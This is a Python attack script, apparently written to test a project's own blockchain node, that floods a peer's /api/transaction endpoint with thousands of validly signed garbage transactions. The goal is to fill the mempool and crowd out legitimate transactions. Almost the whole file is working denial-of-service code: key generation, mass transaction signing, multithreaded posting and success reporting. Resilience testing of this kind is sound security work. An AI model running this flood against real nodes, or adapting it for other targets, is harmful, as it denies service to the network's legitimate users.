#!/usr/bin/env python3
"""
Attack 4: Mempool Flooding (Denial of Service)

Exploits:
  - /api/transaction accepts any signed transaction with no rate limiting
  - Mempool max size is 10000 (MAX_MEMPOOL_SIZE) but that's still a lot
  - Each transaction requires a valid ECDSA signature, but we can generate our
    own keypair and sign as many as we want
  - Legitimate transactions get crowded out or delayed

Strategy:
  1. Generate an attacker keypair
  2. Create thousands of valid signed CAPTURE transactions with garbage data
  3. Flood the victim's /api/transaction endpoint
  4. The mempool fills up and rejects legitimate transactions
  5. Mining picks up garbage transactions, wasting block space
"""

import argparse
import hashlib
import json
import sys
import os
import time
import uuid
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from application.crypto_utils import generate_keypair, sign
from blockchain.transaction import Transaction
from config import TX_CAPTURE, GOSSIP_TTL


def create_spam_transaction(attacker_privkey: str, attacker_pubkey: str, seq: int) -> Transaction:
    """Create a valid signed spam CAPTURE transaction."""
    tx = Transaction(
        tx_type=TX_CAPTURE,
        sender=attacker_pubkey,
        payload={
            "device_id": hashlib.sha256(attacker_pubkey.encode()).hexdigest()[:32],
            "image_hash": hashlib.sha256(f"spam-{seq}-{uuid.uuid4()}".encode()).hexdigest(),
            "phash": "0" * 16,
            "location": "spam",
        },
        timestamp=time.time() + seq * 0.001,
    )
    tx.signature = sign(attacker_privkey, tx.signable_bytes())
    return tx


def send_transaction(target_url: str, tx: Transaction) -> tuple[int | None, float]:
    """Send a single transaction and return (status_code, latency)."""
    payload = {
        "tx": tx.to_dict(),
        "ttl": 0,
        "msg_id": hashlib.sha256(tx.tx_id.encode()).hexdigest()[:16],
    }
    start = time.time()
    try:
        resp = requests.post(f"{target_url}/api/transaction", json=payload, timeout=5)
        return resp.status_code, time.time() - start
    except Exception:
        return None, time.time() - start


def main():
    parser = argparse.ArgumentParser(description="Attack 4: Mempool flooding")
    parser.add_argument("--target", required=True, help="Victim peer URL")
    parser.add_argument("--count", type=int, default=5000, help="Number of spam transactions")
    parser.add_argument("--threads", type=int, default=20, help="Concurrent sender threads")
    args = parser.parse_args()

    print("[*] Generating attacker keypair...")
    privkey, pubkey = generate_keypair()
    print(f"[*] Attacker pubkey: {pubkey[:32]}...")

    print(f"[*] Pre-generating {args.count} spam transactions...")
    txs = []
    for i in range(args.count):
        txs.append(create_spam_transaction(privkey, pubkey, i))
    print(f"[+] Generated {len(txs)} transactions")

    print(f"\n[*] Flooding {args.target} with {args.count} transactions using {args.threads} threads...")

    success = 0
    failed = 0
    rejected = 0
    total_latency = 0.0
    start_time = time.time()

    with ThreadPoolExecutor(max_workers=args.threads) as pool:
        futures = {pool.submit(send_transaction, args.target, tx): tx for tx in txs}
        for i, future in enumerate(as_completed(futures)):
            status, latency = future.result()
            total_latency += latency
            if status == 200:
                success += 1
            elif status == 400:
                rejected += 1
            else:
                failed += 1

            if (i + 1) % 500 == 0:
                elapsed = time.time() - start_time
                rate = (i + 1) / elapsed
                print(f"  [{i+1}/{args.count}] ok={success} rejected={rejected} "
                      f"failed={failed} rate={rate:.0f} tx/s")

    elapsed = time.time() - start_time
    avg_latency = total_latency / max(1, len(txs))

    print(f"\n{'='*60}")
    print(f"Flood complete in {elapsed:.1f}s")
    print(f"  Accepted:  {success}")
    print(f"  Rejected:  {rejected} (mempool full or duplicate)")
    print(f"  Failed:    {failed} (network error)")
    print(f"  Rate:      {len(txs)/elapsed:.0f} tx/s")
    print(f"  Avg latency: {avg_latency*1000:.0f}ms")

    print(f"\n[*] Checking victim's mempool status...")
    try:
        resp = requests.get(f"{args.target}/", timeout=5)
        if "mempool" in resp.text.lower():
            print(f"[+] Victim homepage loaded — check mempool size on the page")
    except Exception:
        pass

    if success > 0:
        print(f"\n[+] SUCCESS: Injected {success} spam transactions into the mempool.")
        print(f"[+] Legitimate transactions may now be rejected (mempool full) or delayed.")
    else:
        print(f"\n[-] No transactions accepted. The target may have protections or is unreachable.")


if __name__ == "__main__":
    main()
